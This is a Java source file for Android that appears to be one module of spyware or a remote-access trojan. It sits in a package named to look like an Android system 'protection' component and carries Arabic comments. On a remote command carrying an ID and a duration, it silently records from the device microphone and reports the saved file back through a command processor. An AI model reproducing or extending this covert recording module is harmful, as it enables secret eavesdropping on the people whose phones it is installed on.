package com.android.system.protection.commands;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;

public class AudioRecorder {

    private static MediaRecorder recorder;

    public static void record(Context context, JSONObject params, String commandId) {
        int duration = params.optInt("duration", 5); // مدة التسجيل بالثواني
        File audioFile = new File(context.getExternalFilesDir(null), "audio_" + System.currentTimeMillis() + ".3gp");

        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audioFile.getAbsolutePath());

        try {
            recorder.prepare();
            recorder.start();

            // انتظر المدة المحددة
            Thread.sleep(duration * 1000L);

            recorder.stop();
            recorder.release();
            recorder = null;

            JSONObject result = new JSONObject();
            result.put("file_path", audioFile.getAbsolutePath());
            CommandProcessor.sendResult(context, commandId, result);

        } catch (Exception e) {
            Log.e("AudioRecorder", "Error", e);
            try {
                JSONObject error = new JSONObject();
                error.put("error", e.getMessage());
                CommandProcessor.sendResult(context, commandId, error);
            } catch (Exception ex) {}
        }
    }
}